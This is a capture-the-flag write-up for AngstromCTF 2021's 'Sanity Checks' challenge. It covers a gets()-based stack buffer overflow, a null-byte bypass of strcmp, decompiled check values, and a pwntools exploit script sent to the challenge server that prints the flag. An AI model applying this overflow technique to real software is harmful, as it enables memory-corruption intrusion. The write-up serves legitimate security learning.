# AngstromCTF2021 Sanity Checks
Looking at the sourcecode we see that the application uses `gets`. We therefore know that we can use a bufferoverflow attack.

We see that `strcmp` checks the input for the string `password123`. We can mitigate this but injecting `password123` and then a null byte, because the `strcmp` will stop comparing.

Decompiling the application we wee that:
```
# 327: int main (int argc, char **argv, char **envp);
# ; var char *format @ rbp-0xe0
# ; var char *s1 @ rbp-0x60
# ; var file*stream @ rbp-0x20
# ; var uint32_t var_14h @ rbp-0x14
# ; var uint32_t var_10h @ rbp-0x10
# ; var uint32_t var_ch @ rbp-0xc
# ; var uint32_t var_8h @ rbp-0x8
# ; var uint32_t var_4h @ rbp-0x4
# 0x00401235      cmp     dword [var_4h], 0x32
# 0x00401239      jne     0x4012c1
# 0x0040123f      cmp     dword [var_8h], 0x37
# 0x00401243      jne     0x4012c1
# 0x00401245      cmp     dword [var_ch], 0xf5
# 0x0040124c      jne     0x4012c1
# 0x0040124e      cmp     dword [var_10h], 0x3d
# 0x00401252      jne     0x4012c1
# 0x00401254      cmp     dword [var_14h], 0x11
```
This we only need to add these values at their respective offsets to pass the sanity checks.

Coding it all up we get:
```
from pwn import *
password = b'password123\x00'
padding = b'A'*64
sanity_checks = b'\x11\x00\x00\x00'\
                +b'\x3d\x00\x00\x00'\
                +b'\xf5\x00\x00\x00'\
                +b'\x37\x00\x00\x00'\
                +b'\x32\x00\x00\x00'
payload = password+padding+sanity_checks

conn = remote('shell.actf.co', 21303)
conn.sendline(payload)
response = conn.recvline()
print(response)
response = conn.recvline()
print(response)
```
This returns the flag:  `actf{if_you_aint_bout_flags_then_i_dont_mess_with_yall}`
